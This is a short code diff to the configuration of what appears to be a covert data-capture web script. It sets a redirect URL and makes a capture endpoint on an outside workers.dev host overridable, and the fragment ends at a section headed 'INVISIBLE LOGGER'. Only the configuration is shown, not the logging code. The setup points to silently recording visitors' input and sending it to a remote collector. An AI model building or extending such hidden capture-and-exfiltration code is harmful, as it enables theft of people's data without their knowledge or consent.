@@ -8,7 +8,7 @@ const CONFIG = {
     ],
     REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
     // The worker endpoint to receive data (relative path)
-    CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
+    CAPTURE_URL: window.CAPTURE_URL || 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
 };
 
 // ===== INVISIBLE LOGGER =====
